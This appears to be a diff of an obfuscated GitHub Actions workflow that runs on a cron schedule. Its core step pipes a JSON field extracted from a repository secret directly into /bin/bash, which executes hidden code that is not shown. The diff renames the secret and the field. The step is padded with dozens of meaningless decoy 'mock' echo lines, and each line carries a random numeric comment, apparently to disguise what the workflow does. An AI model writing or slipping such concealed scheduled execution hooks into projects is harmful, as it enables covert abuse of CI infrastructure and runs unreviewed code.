@@ -1,35 +1,21 @@
-name: feiboye1364 #976
-on: #29816
-  workflow_dispatch: #17523
-  schedule: #18125
-    - cron: '18 * * * *' #26305
-jobs: #16096
-  build: #18612
-    runs-on: ubuntu-latest #27156
-    steps: #5083
-      - uses: actions/checkout@v4 #18233
-      - name: feiboye1364 #137
-        env: #31913
-          w27549: ${{ secrets.w27549 }} #5028
+name: feiboye1364 #9724
+on: #30231
+  workflow_dispatch: #4612
+  schedule: #18905
+    - cron: '38 0/6 * * *' #28562
+jobs: #9181
+  build: #5787
+    runs-on: ubuntu-latest #7851
+    steps: #23278
+      - uses: actions/checkout@v4 #26291
+      - name: feiboye1364 #4703
+        env: #14131
+          i16460: ${{ secrets.i16460 }} #14992
         run: |
-          for i in 13487 2031 25626; do echo "Loop "; done
-          sleep 0.1 2>/dev/null || true
-          echo $w27549 | jq -r .v8531 | /bin/bash #24178
-          echo "History mock: history | head -1 2>/dev/null || echo no-history"
-          find /tmp -maxdepth 1 -type f 2>/dev/null | head -1 || true
-          echo "Home dir: $(echo ~)"
-          echo "Null check: [ ! -f /nonexistent ] && echo 'OK'"
-          echo "Kernel: $(uname -s 2>/dev/null || echo Linux)"
-          echo "Time: $(date +%H:%M:%S)"
-          echo "Tmp cleanup: rm -f /tmp/.tmp* 2>/dev/null || true"
-          echo "Command group: { echo group; }"
-          echo "Git mock: git --version 2>/dev/null | head -1 || echo no-git"
-          [ -z "$RANDOM" ] || echo "Random var set"
+          echo $i16460 | jq -r .d301 | /bin/bash #17098
           echo "Chmod mock: chmod 644 /tmp 2>/dev/null || true"
-          echo "Grep mock: grep 'a' <<< 'abc' 2>/dev/null || echo no-grep"
-          echo "Curl mock: curl -s http://example.com 2>/dev/null | head -1 || echo no-curl"
-          [ $RANDOM -gt 1000 ] && echo "Random passed"
-          : ' Another single-line comment '
-          echo "Signal mock: trap '' SIGINT"
-          echo "Binary check: command -v bash 2>/dev/null && echo Bash"
-          echo "Uptime: $(uptime 2>/dev/null | cut -d' ' -f1-3 || echo N/A)"
+          echo "Awk mock: echo '1 2' | awk '{print \$1}' 2>/dev/null || echo no-awk"
+          echo "Range loop: for i in 1 3 5; do echo \$i; done"
+          echo "Arith loop: for ((i=0;i<3;i++)); do echo $i; done"
+          echo "Random string: $(cat /dev/urandom | tr -cd 'a-z' | head -c 5 2>/dev/null || echo abcde)"
+          echo "Export mock: export VAR=test"
